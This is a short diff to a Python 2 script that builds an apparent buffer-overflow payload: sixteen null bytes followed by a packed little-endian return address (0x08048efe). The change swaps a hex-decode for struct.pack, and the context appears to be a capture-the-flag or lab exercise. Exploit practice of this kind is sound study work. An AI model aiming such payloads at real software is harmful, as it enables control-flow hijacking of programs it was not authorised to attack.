@@ -1,2 +1,3 @@
-add = 'fe8e0408'
-print '\x00' * 16 + add.decode('hex')
+from struct import pack
+add = pack("<I", 0x08048efe)
+print '\x00' * 16 + add
